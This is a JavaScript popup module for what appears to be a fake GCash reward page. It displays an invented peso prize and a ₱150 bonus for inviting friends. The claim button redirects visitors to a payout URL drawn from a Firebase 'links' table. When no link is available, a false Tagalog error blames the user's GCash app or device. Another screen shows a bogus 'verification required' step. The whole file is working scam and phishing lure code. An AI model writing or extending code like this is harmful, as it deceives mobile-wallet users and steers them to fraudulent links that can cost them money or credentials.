/**
 * Popup Share Module - Integrated with PopupModule
 * Uses PopupModule for show/close, manages own content phases
 */

// ========== GLOBAL ==========
let currentBalance = 0;
let currentPhase = 1;

// ========== GET PAYOUT LINK ==========
async function getLatestPayoutLink() {
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            return { key: key, url: linkData.url };
        }
        return null;
    } catch(e) {
        return null;
    }
}

// ========== PHASE 1: DEFAULT POPUP ==========
function showPhase1(balance) {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    currentBalance = balance;
    currentPhase = 1;
    
    popupInner.innerHTML = `
        <div class="popup-close">✕</div>
        <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
        <div class="prize-amount">₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span></div>
        <div class="divider"></div>
        <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
        <div class="luckyday-image-container">
            <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
        </div>
        <div class="divider"></div>
        <div class="indicator-group">
            <div class="indicator"></div>
            <div class="indicator"></div>
            <div class="indicator"></div>
        </div>
        
        <div style="display: flex; gap: 10px; margin: 10px 0;">
            <button class="claim-gcash-button" id="claimThruBtn" style="flex: 1; background: linear-gradient(135deg, #00a650, #008c3a);">
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
            </button>
            <button class="claim-gcash-button" id="claimViaBtn" style="flex: 1; background: linear-gradient(135deg, #0066ff, #0044cc);">
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH
            </button>
        </div>

        <div class="button-separator"></div>

        <button class="back-btn" id="backBtnPopup">
            ← BACK
        </button>
    `;
    
    // ATTACH CLICK EVENTS
    const closeBtn = popupInner.querySelector('.popup-close');
    if (closeBtn) closeBtn.onclick = function() { window.PopupModule.close(); };
    
    const backBtn = popupInner.querySelector('#backBtnPopup');
    if (backBtn) backBtn.onclick = function() { window.PopupModule.close(); };
    
    const claimThruBtn = popupInner.querySelector('#claimThruBtn');
    if (claimThruBtn) claimThruBtn.onclick = function() { showPhase2(); };
    
    const claimViaBtn = popupInner.querySelector('#claimViaBtn');
    if (claimViaBtn) claimViaBtn.onclick = function() { showPhase3(); };
}

// ========== PHASE 2: CLAIM THRU GCASH ==========
function showPhase2() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    currentPhase = 2;
    
    popupInner.innerHTML = `
        <div class="popup-close">✕</div>
        <h2 class="popup-title">🔗 WITHDRAWAL LINK</h2>
        <div class="divider"></div>
        <div class="invite-text">Click below to claim ₱<strong>${currentBalance.toFixed(2)}</strong></div>
        
        <button class="claim-gcash-button" id="proceedBtn" style="background: linear-gradient(135deg, #00a650, #008c3a);">
            <img src="images/gc_icon.png" class="gc-icon"> PROCEED TO GCASH
        </button>

        <div class="button-separator"></div>

        <button class="back-btn" id="backBtnPhase2">
            ← BACK
        </button>
    `;
    
    const closeBtn = popupInner.querySelector('.popup-close');
    if (closeBtn) closeBtn.onclick = function() { window.PopupModule.close(); };
    
    const backBtn = popupInner.querySelector('#backBtnPhase2');
    if (backBtn) backBtn.onclick = function() { showPhase1(currentBalance); };
    
    const proceedBtn = popupInner.querySelector('#proceedBtn');
    if (proceedBtn) proceedBtn.onclick = async function() {
        const linkData = await getLatestPayoutLink();
        if (linkData && linkData.url) {
            window.location.href = linkData.url;
        } else {
            alert("⚠️ Withdrawal Unsuccessful\n\nMukhang hindi namin ma-proseso ang iyong request dahil kailangan ng GCash App update o kaya ay wala itong mahanap na GCash sa iyong device.\n\nSolution: Siguraduhing updated ang iyong app o subukang mag-login sa ibang device para makuha na ang iyong rewards! 🚀");
        }
    };
}

// ========== PHASE 3: CLAIM VIA GCASH ==========
function showPhase3() {
    const popupInner = document.querySelector('.popup-inner');
    if (!popupInner) return;
    
    currentPhase = 3;
    
    popupInner.innerHTML = `
        <div class="popup-close">✕</div>
        <h2 class="popup-title">🔒 VERIFICATION REQUIRED</h2>
        <div class="divider"></div>
        <div class="invite-text">Due to security protocol, you need to verify your account first.</div>
        
        <button class="claim-gcash-button" id="verifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000);">
            📞 VERIFY NOW
        </button>

        <div class="button-separator"></div>

        <button class="back-btn" id="backBtnPhase3">
            ← BACK
        </button>
    `;
    
    const closeBtn = popupInner.querySelector('.popup-close');
    if (closeBtn) closeBtn.onclick = function() { window.PopupModule.close(); };
    
    const backBtn = popupInner.querySelector('#backBtnPhase3');
    if (backBtn) backBtn.onclick = function() { showPhase1(currentBalance); };
    
    const verifyBtn = popupInner.querySelector('#verifyBtn');
    if (verifyBtn) verifyBtn.onclick = function() {
        alert("Verification feature coming soon...");
    };
}

// ========== SHOW POPUP (Called by ClaimButtonModule) ==========
function showPopup(balance) {
    currentBalance = balance;
    
    // Update balance in PopupModule
    if (window.PopupModule) {
        // Temporarily override the show method's balance update
        const balanceSpan = document.getElementById('popupBalanceAmount');
        if (balanceSpan) balanceSpan.innerText = balance.toFixed(2);
    }
    
    // Show Phase 1 content first
    showPhase1(balance);
    
    // Use PopupModule to show the popup
    if (window.PopupModule) {
        window.PopupModule.show(balance);
    }
}

// ========== OVERRIDE PopupModule.show to use our phases ==========
if (window.PopupModule) {
    const originalShow = window.PopupModule.show;
    window.PopupModule.show = function(balance) {
        showPopup(balance);
    };
}

// ========== EXPORT ==========
window.showPopup = showPopup;
window.showPhase1 = showPhase1;
window.showPhase2 = showPhase2;
window.showPhase3 = showPhase3;
